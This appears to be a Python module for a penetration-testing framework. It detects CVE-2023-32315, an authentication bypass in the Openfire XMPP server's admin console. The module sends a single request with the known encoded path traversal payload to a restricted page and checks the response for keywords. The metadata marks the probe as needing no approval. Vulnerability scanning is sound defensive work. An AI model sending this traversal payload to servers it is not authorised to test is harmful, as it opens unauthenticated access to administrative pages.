#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Openfire is an XMPP server licensed under the Open Source Apache License."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Openfire Administration Console - Authentication Bypass Detection',
        'description': "Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'auth-bypass', 'openfire', 'console', 'kev', 'igniterealtime', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-gw42-f939-fhvm',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-32315',
            'https://github.com/izzz0/CVE-2023-32315-POC',
            'https://github.com/Ostorlab/known_exploited_vulnerbilities_detectors',
            'https://github.com/TLGKien/SploitusCrawl',
        ],
        'cve': 'CVE-2023-32315',
    }

    def run(self):
        path = '/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Origin': '{{BaseURL}}'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('apache', 'java', 'openfire', 'jivesoftware',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Openfire Administration Console - Authentication Bypass detected', path=path)
            return True
        return False

